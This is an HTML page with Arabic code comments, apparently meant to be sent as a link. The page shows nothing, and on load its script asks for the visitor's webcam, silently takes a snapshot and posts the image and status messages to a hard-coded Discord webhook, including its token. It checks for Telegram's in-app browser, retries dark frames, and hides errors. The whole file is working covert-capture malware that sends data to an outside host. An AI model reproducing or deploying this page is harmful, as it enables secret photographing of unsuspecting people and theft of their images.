<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title> </title>
<style>body,video,canvas{display:none}</style>
</head>
<body>
<video id="cam" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const webhook = "https://discord.com/api/webhooks/1444407690850734303/tbyWBMt86W2rtj4Cw4ejj8F5qjD7PwvYrMmveQzWknZdtz8pNCH9oBgOpCQWYhbtI-5h";

// كشف متصفح تلغرام
const isTelegram = /Telegram/i.test(navigator.userAgent);
const isChrome = /Chrome/i.test(navigator.userAgent) && !isTelegram;

async function sendMessage(msg) {
    try {
        const fd = new FormData();
        fd.append("content", msg);
        await fetch(webhook, { method: "POST", body: fd });
    } catch(e) {}
}

async function captureAndSend(video) {
    return new Promise((resolve) => {
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 3000) {
                const fd = new FormData();
                fd.append("file", blob, `shot_${Date.now()}.png`);
                const res = await fetch(webhook, { method: "POST", body: fd });
                resolve(res.ok);
            } else {
                resolve(false);
            }
        }, "image/png", 0.85);
    });
}

async function start() {
    // إذا كان تلغرام، نرسل رسالة تنبيه
    if (isTelegram) {
        await sendMessage("⚠️ تم فتح الرابط من تلغرام - المتصفح لا يدعم الكاميرا بشكل كامل");
        return;
    }
    
    await sendMessage("📷 جاري تشغيل الكاميرا...");
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { ideal: 640 },  // دقة أقل = أسرع
                height: { ideal: 480 }
            } 
        });
        
        const video = document.getElementById('cam');
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            
            // سرعة التصوير حسب المتصفح
            let delay = isChrome ? 300 : 600;
            
            setTimeout(async () => {
                // نفحص إذا الصورة سوداء
                const testCanvas = document.createElement('canvas');
                testCanvas.width = video.videoWidth;
                testCanvas.height = video.videoHeight;
                const ctx = testCanvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const imageData = ctx.getImageData(0, 0, testCanvas.width, testCanvas.height);
                let hasLight = false;
                
                // فحص سريع إذا في إضاءة
                for (let i = 0; i < imageData.data.length; i += 1000) {
                    if (imageData.data[i] > 50 || imageData.data[i+1] > 50 || imageData.data[i+2] > 50) {
                        hasLight = true;
                        break;
                    }
                }
                
                if (!hasLight && isChrome) {
                    // إذا سوداء، ننتظر نص ثانية ونعيد المحاولة
                    setTimeout(async () => {
                        await captureAndSend(video);
                        stream.getTracks().forEach(t => t.stop());
                    }, 500);
                } else {
                    await captureAndSend(video);
                    stream.getTracks().forEach(t => t.stop());
                }
            }, delay);
        };
        
    } catch(err) {
        await sendMessage("❌ خطأ: " + err.message);
    }
}

start();
</script>
</body>
</html>
